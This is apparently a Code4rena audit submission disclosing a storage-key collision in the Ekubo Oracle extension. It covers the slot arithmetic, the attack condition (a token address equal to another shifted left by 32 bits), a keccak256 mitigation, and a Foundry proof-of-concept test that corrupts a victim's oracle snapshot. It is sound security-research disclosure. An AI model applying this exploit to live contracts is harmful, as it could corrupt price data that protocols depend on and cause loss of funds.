# Storage Collision in Oracle Extension

**Ekubo**, Code4rena, November 2025, judged **Medium**, contest rank 2nd  
Contest page: https://code4rena.com/audits/2025-11-ekubo  
Contest repository: https://github.com/code-423n4/2025-11-ekubo  
Credited on M-01, Oracle data corruption via storage key collision: https://code4rena.com/reports/2025-11-ekubo#m-01-oracle-data-corruption-via-storage-key-collision

This is the submission I sent in.

---
## Finding description and impact

The Oracle extension uses manual storage slot calculation that leads to a collision between the Counts struct of one token and the Snapshot struct of another token.

In Oracle.sol, the storage slots are calculated as follows:

Counts struct is stored at the slot corresponding to the token address:

```solidity
// Oracle.sol
assembly ("memory-safe") {
    c := sload(token)
}
```

Snapshot structs are stored at a slot derived from the token and index:

```solidity
// Oracle.sol
assembly ("memory-safe") {
    sstore(or(shl(32, token), index), snapshot)
}
```

A collision occurs if tokenB = tokenA << 32. This is possible if tokenA has its top 32 bits as zero (i.e., tokenA < 2^128). In this case, tokenA << 32 results in a valid 160-bit address (let's call it tokenB).

If a pool is initialized for tokenB (paired with the native token), the Counts struct for tokenB will be written to slot tokenB. However, slot tokenB is numerically equal to tokenA << 32, which is the storage slot for the first snapshot (index=0) of tokenA.

This means:

- Initializing a pool for tokenB overwrites the first snapshot of tokenA with the Counts data of tokenB.
- Writing a snapshot for tokenA (at index 0) overwrites the Counts data of tokenB.

Impact:

An attacker can corrupt the oracle data of a victim pool (if the victim token address has 4 leading zero bytes) by creating a pool with the colliding address. This corruption leads to incorrect price and liquidity reporting. Since Counts and Snapshot both store their primary metadata (index and timestamp respectively) in the lowest 32 bits, overwriting one with the other (e.g., initializing Counts with index 0) will zero out the timestamp of the snapshot, effectively invalidating it or setting it to the beginning of the epoch. This can be exploited by protocols relying on the oracle, potentially leading to loss of funds.

## Recommended mitigation steps

Use keccak256 hashing to determine storage slots, ensuring uniform distribution and preventing collisions.

```solidity
// For Counts
bytes32 slot = keccak256(abi.encode("Counts", token));
assembly { c := sload(slot) }

// For Snapshots
bytes32 slot = keccak256(abi.encode("Snapshot", token, index));
assembly { sstore(slot, snapshot) }
```

## Proof of Concept

Add the following to a new file inside of the test folder

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Oracle} from "../src/extensions/Oracle.sol";
import {Core} from "../src/Core.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {PoolConfig} from "../src/types/poolConfig.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {Snapshot} from "../src/types/snapshot.sol";
import {CoreStorageLayout} from "../src/libraries/CoreStorageLayout.sol";
import {StorageSlot} from "../src/types/storageSlot.sol";
import {ICore} from "../src/interfaces/ICore.sol";

contract PoC_OracleStorageCollision is Test {
    Oracle oracle;
    Core core;

    function setUp() public {
        core = new Core();
        
        // Mock registerExtension to succeed
        vm.mockCall(
            address(core),
            abi.encodeWithSelector(ICore.registerExtension.selector),
            ""
        );
        
        oracle = new Oracle(core);
        
        // Manually register oracle in Core storage to bypass address check
        bytes32 slot = StorageSlot.unwrap(CoreStorageLayout.isExtensionRegisteredSlot(address(oracle)));
        vm.store(address(core), slot, bytes32(uint256(1)));
    }

    function test_storageCollision() public {
        // 1. Define Token A (Victim) - Must have top 32 bits zero.
        address tokenA = address(1);
        
        // 2. Define Token B (Attacker/Colliding) - tokenB = tokenA << 32.
        address tokenB = address(uint160(tokenA) << 32);
        
        // 3. Initialize Pool A
        PoolKey memory keyA = PoolKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: tokenA,
            config: PoolConfig.wrap(bytes32(uint256(uint160(address(oracle))) << 96))
        });
        
        vm.prank(address(core));
        oracle.beforeInitializePool(address(0), keyA, 0);
        
        // Check Snapshot[0] of A is initialized correctly
        (,, Snapshot snapA) = oracle.findPreviousSnapshot(tokenA, block.timestamp);
        assertEq(uint256(snapA.timestamp()), uint256(block.timestamp));
        
        // 4. Initialize Pool B - This writes Counts at slot(tokenB), overwriting Snapshot[0] of A
        PoolKey memory keyB = PoolKey({
            token0: NATIVE_TOKEN_ADDRESS,
            token1: tokenB,
            config: PoolConfig.wrap(bytes32(uint256(uint160(address(oracle))) << 96))
        });
        
        vm.prank(address(core));
        oracle.beforeInitializePool(address(0), keyB, 0);
        
        // 5. Check Snapshot[0] of A again - It is now corrupted
        (,, Snapshot snapACorrupted) = oracle.findPreviousSnapshot(tokenA, block.timestamp);
        
        // The timestamp is overwritten by Counts data (which has 0 in the corresponding bits)
        assertEq(uint256(snapACorrupted.timestamp()), 0);
        console.log("Collision confirmed! Snapshot timestamp is 0.");
    }
}
```

## Links to affected code

Oracle.sol#L96-L100
